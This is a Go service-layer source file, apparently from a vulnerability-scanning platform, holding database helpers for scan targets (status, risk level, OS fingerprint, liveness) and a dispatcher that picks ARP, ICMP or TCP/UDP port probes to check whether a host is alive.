// UpdateTargetStateById 修改目标状态和目标日志为结束

func (t *TaskTarget) UpdateTargetAndLogStateById(ctx context.Context, targetId int, targetstate, logstate int) error {
	tx := mysql.DB.Begin()
	dCtx := mysql.NewContext(ctx, tx)
	defer tx.Rollback()
	var (
		targetResult mysqls.TaskTarget
		taskLog      mysqls.Tasklog
	)
	err := targetResult.UpdateTargetStatusById(dCtx, targetId, targetstate)
	if err != nil {
		return err
	}
	err = taskLog.UpdateTaskLogStateByTargetId(dCtx, targetId, logstate)
	if err != nil {
		return err
	}
	if err := tx.Commit().Error; err != nil { //提交事务
		return err
	}
	return nil
}

// 删除目标 通过task_id
func (t *TaskTarget) DelTaskInfoByTaskId(ctx context.Context, taskIds []int) error {
	var taskTargetModel mysqls.TaskTarget
	return taskTargetModel.DeleteByTaskIds(ctx, taskIds)
}

// CheckTargetAlive 对目标进行存活性检测
func (t *TaskTarget) CheckTargetAlive(ctx context.Context, target mysqls.TaskTarget) (bool, error) {
	var taskTargetModel mysqls.TaskTarget
	isAlive, err := utils.PingIpIsLive(target.TargetURL)
	if err != nil {
		return false, errors.New("CheckTargetAlive error: " + err.Error())
	}
	if isAlive {
		err = taskTargetModel.UpdateTargetAliveById(ctx, target.ID, 1)
		if err != nil {
			return true, errors.New("CheckTargetAlive error: " + err.Error())
		}
	}
	return isAlive, nil
}

// UpdateTaskCache 删除目标 通过task_id
func (t *TaskTarget) UpdateTaskCache(ctx context.Context, taskCache map[string]string, targetId int, isAlive bool) error {
	var targetCache map[string]int
	err := json.Unmarshal([]byte(taskCache[strconv.Itoa(targetId)]), &targetCache)
	if err != nil {
		return errors.New("UpdateTaskCache error: " + err.Error())
	}
	targetCache["status"] = enums.TargetStatusRunning
	if isAlive {
		targetCache["isAlive"] = 1
	}
	targetCacheByte, _ := json.Marshal(targetCache)
	taskCache[strconv.Itoa(targetId)] = string(targetCacheByte)
	return nil
}

// UpdateTargetStats 更新目标的统计信息
func (t *TaskTarget) UpdateTargetStats(ctx context.Context, targetId, vulNum, risklevel int, vulNumArray [6]int) error {
	var taskTargetModel mysqls.TaskTarget
	return taskTargetModel.UpdateTargetStatsById(ctx, targetId, vulNum, risklevel, vulNumArray)
}

// UpdateTargetAlive 更新是否存活
func (t *TaskTarget) UpdateTargetAlive(ctx context.Context, targetId, isAlive int) error {
	var taskTargetModel mysqls.TaskTarget
	return taskTargetModel.UpdateTargetAliveById(ctx, targetId, isAlive)
}

// UpdateTargetOpSys 更新操作系统
func (t *TaskTarget) UpdateTargetOpSys(ctx context.Context, targetId int, fingerPrintResult MatchResult) error {
	opSys := getSystemFromPortScan(fingerPrintResult.Fingerprint)
	if opSys == "" {
		return nil
	}
	var taskTargetModel mysqls.TaskTarget
	taskTarget, err := taskTargetModel.GetTaskTarget(ctx, targetId)
	if err != nil {
		return err
	}
	return taskTarget.UpdateTargetOpSys(ctx, targetId, opSys)
}

// UpdateTargetOpSys 从端口扫描结果中获取操作系统
func getSystemFromPortScan(fingerprintInfo *FingerprintInfo) string {
	for _, item := range strings.Split(fingerprintInfo.ServiceName, "/") {
		temp := strings.Split(item, "[")
		if len(temp) == 2 {
			item = temp[0]
		}
		for _, system := range SystemList {
			if item == system {
				return system
			}
		}
	}
	return ""
}

// UpdateTargetRisk 更新目标的风险等级
func (t *TaskTarget) UpdateTargetRisk(ctx context.Context, targetId, risk int) error {
	var taskTargetModel mysqls.TaskTarget
	taskTarget, err := taskTargetModel.GetTaskTarget(ctx, targetId)
	if err != nil {
		return err
	}
	if risk == enums.VulLibrariesRiskDead {
		if taskTarget.RiskLevel > enums.TargetRiskHigh {
			taskTarget.RiskLevel = enums.TaskRiskHigh
		}
	} else if risk == enums.VulLibrariesRiskHigh {
		if taskTarget.RiskLevel > enums.TargetRiskHigh {
			taskTarget.RiskLevel = enums.TargetRiskHigh
		}
	} else if risk == enums.VulLibrariesRiskMiddle {
		if taskTarget.RiskLevel > enums.TargetRiskMid {
			taskTarget.RiskLevel = enums.TargetRiskMid
		}
	} else if risk == enums.VulLibrariesRiskLow {
		if taskTarget.RiskLevel > enums.TargetRiskLow {
			taskTarget.RiskLevel = enums.TargetRiskLow
		}
	}
	err = taskTarget.UpdateTaskTarget(ctx)
	if err != nil {
		return nil
	}
	return nil
}

// HandleTimeoutTargets 处理超时的检测目标
func (t *TaskTarget) HandleTimeoutTargets(ctx context.Context) error {
	var target mysqls.TaskTarget
	return target.HandleTimeoutTargetList(ctx)
}

// GetTargetByStatus 根据状态获取目标列表
func (t *TaskTarget) GetTargetByStatus(ctx context.Context, status int) []mysqls.TaskTarget {
	var targetResult mysqls.TaskTarget
	return targetResult.GetTargetByStatus(ctx, status)
}

// GetTargetsByTargetURL 根据目标获取目标数据
func (t *TaskTarget) GetTargetsByTargetURL(ctx context.Context, taskId int, targetUrl string) (mysqls.TaskTarget, error) {
	var targetResult mysqls.TaskTarget
	return targetResult.GetTargetsByTargetURL(ctx, taskId, targetUrl)
}

// GetTargetsByTargetURLLike 根据目标模糊搜索获取目标数据
func (t *TaskTarget) GetTargetsByTargetURLLike(ctx context.Context, taskId int, targetUrl string) (mysqls.TaskTarget, error) {
	var targetResult mysqls.TaskTarget
	return targetResult.GetTargetsByTargetURLLike(ctx, taskId, targetUrl)
}

// GetTargetCount ß获取目标总数或根据开始时间获取目标总数
func (t *TaskTarget) GetTargetCount(ctx context.Context, startTime string) (int, int) {
	var targetModel mysqls.TaskTarget
	total, filterTotal := targetModel.GetTargetCount(ctx, startTime)
	return int(total), int(filterTotal)
}

// GetTargetRiskStat 目标风险统计
func (t *TaskTarget) GetTargetRiskStat(ctx context.Context, uid int, role int) []mysqls.TargetRiskStat {
	var targetModel mysqls.TaskTarget
	targetList := targetModel.GetTargetRiskStat(ctx, uid, role)
	return targetList
}

// 添加横向目标
func (t *TaskTarget) AddHengxiangTarget(ctx context.Context, taskId, hengxiangPid int, targetUrl string, riskLevel, userId int) int {
	// 记录父级ID
	extendField := map[string]int{
		"hengxiang_pid": hengxiangPid,
	}
	extendFieldStr, _ := json.Marshal(extendField)

	target := mysqls.TaskTarget{
		TaskID:           taskId,
		TargetURL:        targetUrl,
		Status:           enums.TargetStatusFinish,      // 横向目标直接结束
		Weight:           enums.TaskWeightLow,           // 横向目标权重最低
		RiskLevel:        riskLevel,                     // 风险等级由横向脚本决定
		IsAlive:          enums.TargetIsAliveY,          // 默认存活
		TargetType:       enums.TaskCheckTargetTypeHost, // 主机类型
		TaskTemplateID:   0,                             // 由于不需要继续跑，模版ID设置为0
		TaskTemplateJSON: "",
		UserID:           userId,
		IsRemoteSession:  enums.TargetIsRemoteSessionN,
		CreateTime:       time.Now(),
		UpdateTime:       time.Now(),
		EndTime:          time.Now(), // 默认1970年
		ExtendField:      string(extendFieldStr),
	}
	_ = target.AddTaskTarget(ctx)
	return target.ID
}

// 获取所有目标地址，并按照目标地址分组
func (t *TaskTarget) AllTargetUrl(ctx context.Context, status int) []mysqls.TaskTarget {
	var taskTargetModel mysqls.TaskTarget
	return taskTargetModel.AllTargetUrl(ctx, status)
}

// GetTargetsByTaskIdAndStatus 根据任务ID和状态获取目标列表
func (t *TaskTarget) GetTargetsByTaskIdAndStatus(ctx context.Context, taskId, status int) []mysqls.TaskTarget {
	var target mysqls.TaskTarget
	return target.GetTargetsByTaskIdAndStatus(ctx, taskId, status)
}

// GetTargetsByTaskIdAndStatusList 根据任务ID和状态获取目标列表
func (t *TaskTarget) GetTargetsByTaskIdAndStatusList(ctx context.Context, taskId int, status []int) []mysqls.TaskTarget {
	var target mysqls.TaskTarget
	return target.GetTargetsByTaskIdAndStatusList(ctx, taskId, status)
}

// AliveProbe 对目标进行存活探测
func (t *TaskTarget) AliveProbe(ip string, configJson enums.ConfigJson) (int, error) {
	var (
		isAlive        bool
		err            error
		result         = enums.TargetIsAliveN
		aliveProbeType = configJson.AliveProbeConfig.AliveProbeType
		aliveProbePort = configJson.AliveProbeConfig.ProbePort
	)
	if !configJson.AliveProbeConfig.IsOpen {
		return result, nil
	}
	if aliveProbeType == enums.TaskConfigurationAliveProbeArp {
		isAlive, err = network.ArpPingWithTimeout(ip, 3*time.Second)
	} else if aliveProbeType == enums.TaskConfigurationAliveProbeICMP {
		isAlive, err = network.IcmpPingWithTimeout(ip, 3*time.Second)
	} else if aliveProbeType == enums.TaskConfigurationAliveProbeTCP {
		isAlive, err = network.HandleTcpPortScan(ip, aliveProbePort, 3*time.Second)
	} else if aliveProbeType == enums.TaskConfigurationAliveProbeUDP {
		isAlive, err = network.HandleUdpPortScan(ip, aliveProbePort, 3*time.Second)
	} else if aliveProbeType == enums.TaskConfigurationAliveProbeTCPACK {
		isAlive, err = network.HandleTcpAckPortScan(ip, aliveProbePort, 3*time.Second)
	} else if aliveProbeType == enums.TaskConfigurationAliveProbeTCPSYN {
		isAlive, err = network.HandleTcpSynPortScan(ip, aliveProbePort, 3*time.Second)
	}
	if err != nil {
		return result, err
	}
	if isAlive {
		result = enums.TargetIsAliveY
	}
	return result, nil
}

// TargetListByTargetUrl 通过target_url检索最新的一条已完成的目标
func (t *TaskTarget) TargetListByTargetUrl(ctx context.Context, targetURL string) (mysqls.TaskTarget, error) {
	var target mysqls.TaskTarget
	return target.GetTargetListByTargetUrl(ctx, targetURL)
}

// BatchTargetListByTargetUrl 批量通过target_url检索最新的一条已完成的目标
func (t *TaskTarget) BatchTargetListByTargetUrl(ctx context.Context, targetURL []string) ([]mysqls.TaskTarget, error) {
	var target mysqls.TaskTarget
	return target.BatchGetTargetListByTargetUrl(ctx, targetURL)
}

// GetFinishedTargetURLToIDMap  以 target_url 为 key，ID 为最大已完成的 ID
func (t *TaskTarget) GetFinishedTargetURLToIDMap(ctx context.Context) (map[string]int, error) {
	var target mysqls.TaskTarget
	return target.GetFinishedTargetURLToIDMap(ctx)
}

// GetFinishedTargetURLToIDMapByTime  时间范围内 以 target_url 为 key，ID 为最大已完成的 ID
func (t *TaskTarget) GetFinishedTargetURLToIDMapByTime(ctx context.Context, startTime, endTime string) (map[string]int, error) {
	var target mysqls.TaskTarget
	return target.GetFinishedTargetURLToIDMapByTime(ctx, startTime, endTime)
}

// GetAssetTargetOpenPort 获取资产中 任务的开发端口
func (t *TaskTarget) GetAssetTargetOpenPort(ctx context.Context, targetIds any) ([]mysqls.TaskTaskResult, error) {
	var targetResult mysqls.TaskTaskResult
	taskResultlist, err := targetResult.GetTaskTaskResultByType(ctx, enums.TaskResultObjTypeInfo, enums.TaskResultSubObjTypeService, targetIds)
	if err != nil {
		return nil, err
	}
	return taskResultlist, nil
}
